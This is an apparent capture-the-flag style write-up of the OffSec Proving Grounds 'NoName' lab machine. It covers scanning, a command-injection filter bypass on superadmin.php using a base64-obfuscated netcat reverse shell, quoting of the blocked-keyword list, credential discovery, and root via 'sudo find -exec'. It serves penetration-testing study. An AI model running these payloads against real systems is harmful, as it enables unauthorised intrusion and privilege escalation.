---
title: OffSec PG - NoName
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.225.15`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15`

OS Detection &rarr;  `os_info`

| **Port** | **Service** | **Other details (if any)**     |
| -------- | ----------- | ------------------------------ |
| 80       | HTTP        | Apache httpd 2.4.29 ((Ubuntu)) |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.225.15 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/raft-small-words.txt -x html,php,txt`

Directories/files listed &rarr;

- index.php
- icons/
- superadmin.php

---

## Exploitation

Looking at `superadmin.php`, it seems like a ping command and thus may be vulnerable to command injection. Using `;` didn't work, neither did `&&`. `|` did work and using it to print the code of the file like `127.0.0.1 | cat superadmin.php` shows that `";","&&","/","bin","&"," &&","ls","nc","dir","pwd"` are all blocked.

Therefore, escaping the blocks by using

```
127.0.0.1 | `echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjI1IDMwMDIK | base64 -d`
```

This gives a shell as the `www-data` user and thus the user flag.

---

## Privilege Escalation

### User

Looking at the `/etc/passwd` file, the users of importance are `root`, `haclabs` and `yash`. Used `find / -type f -user yash 2>/dev/null` to list files owned by `yash` and this prints a file `/usr/share/hidden/.passwd`. Looking at the permissions, it is world readable.

The contents of the file is a password `haclabs1234`. This works for the credentials `haclabs:haclabs1234`. This grants a shell as `haclabs` user. Looking at `sudo -l`, this user can run `/usr/bin/find` as root without any password. Thus, using the command `sudo find . -exec /bin/bash \; -quit`, a root shell can be gained. This gives the root flag.

---
